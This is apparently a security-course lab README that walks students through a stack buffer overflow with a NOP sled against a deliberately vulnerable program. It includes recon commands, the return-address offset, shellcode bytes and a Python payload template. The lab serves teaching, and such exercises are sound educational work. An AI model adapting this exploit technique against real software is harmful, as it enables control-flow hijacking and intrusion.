# Level 2 — "NOP Sled" (Medium)

Level 1 corrupted a neighboring variable. Level 2 hijacks **control flow**.

You overflow a stack buffer, overwrite the **saved return address**, and point
it into a long runway of NOP instructions (`\x90`). The CPU slides down the
sled into your **shellcode**, which must call `win()`.

**Win condition:** see

```text
*** NOP SLED LANDED :: SHELLCODE REACHED WIN() ***
*** LEVEL 2 CLEARED ***
```

You do **not** edit `vulnerable.c`. You craft the input payload.

---

## Why a NOP sled?

Your return-address guess does not need to be *perfect*. If you land anywhere
inside a long sequence of `\x90` (NOP = "do nothing"), the CPU keeps walking
forward until it hits your shellcode. That runway is the **NOP sled**.

```text
buffer (low address) ------> higher addresses ------> saved return addr
[ NOP NOP NOP NOP | shellcode ] .............. [ addr pointing into NOPs ]
         ^                                      |
         +--------------------------------------+
```

---

## Step 1 — Build

```bash
make
file vulnerable
```

This level links with `-z execstack` so the stack is executable (otherwise
injected shellcode cannot run).

## Step 2 — Recon

```bash
./vulnerable
```

Note the printed `[leak] buffer @ 0x........` address. That is where your
NOP sled + shellcode will live.

Find `win` with static GDB:

```bash
gdb -q -batch -ex "info address win" ./vulnerable
```

## Step 3 — Find the offset to the return address

You must write enough bytes to fill `buffer[128]`, then whatever the compiler
placed between the buffer and the saved return address (saved frame pointer
and possible alignment padding), and then overwrite the return address.

On the course Docker image (Debian bookworm i386, this Makefile), the measured
offset is:

```text
offset to return address = 140
```

(Not always `128 + 4` — modern gcc may insert alignment padding. Always
verify if you change compilers or flags.)

Verify on a real x86 GDB session if you can (`cyclic` pattern / `info frame`).
Under Docker emulation, start with **140** and adjust if needed.

## Step 4 — Build the payload

Structure:

1. Many `\x90` NOPs (the sled)
2. Short shellcode that calls `win` (provided below — fill in `win`'s address)
3. Padding until you reach the return-address slot
4. A 4-byte little-endian address pointing **into the middle of your NOP sled**
   (use the leaked buffer address + some offset into the sled)

Example shellcode (32-bit): `mov eax, win_addr` ; `call eax`

```text
\xb8 <win_addr as 4 little-endian bytes> \xff\xd0
```

Template (adjust addresses/offsets from recon):

```python
import sys
import struct

buf_addr = 0xFFFFDxxx   # from the [leak] line (re-read each run)
win_addr = 0x08049xxx   # from: info address win
offset   = 140          # measured on course Docker i386 image

nops = b"\x90" * 64
shellcode = b"\xb8" + struct.pack("<I", win_addr) + b"\xff\xd0"
padding = b"A" * (offset - len(nops) - len(shellcode))
ret = struct.pack("<I", buf_addr + 16)  # land mid-sled

sys.stdout.buffer.write(nops + shellcode + padding + ret)
```

Run:

```bash
python3 solve.py | ./vulnerable
```

Prefer `setarch "$(uname -m)" -R ./vulnerable` on a real Linux box so ASLR
does not move the stack between runs.

## Step 5 — Submit

- Your solve script / payload
- The leaked buffer address and `win` address you used
- 4–6 sentences: what a NOP sled is, why you overwrite the return address,
  and why the stack must be executable for this level

---

## What you should understand after this

- The saved return address controls where the function returns.
- Overwriting it redirects the CPU (control-flow hijack).
- NOPs (`\x90`) buy you tolerance on the landing address.
- Shellcode is just bytes the CPU executes if you point EIP/RIP at them.
- NX / non-executable stacks exist specifically to stop this class of attack
  (`-z execstack` turns that protection off for the lab).
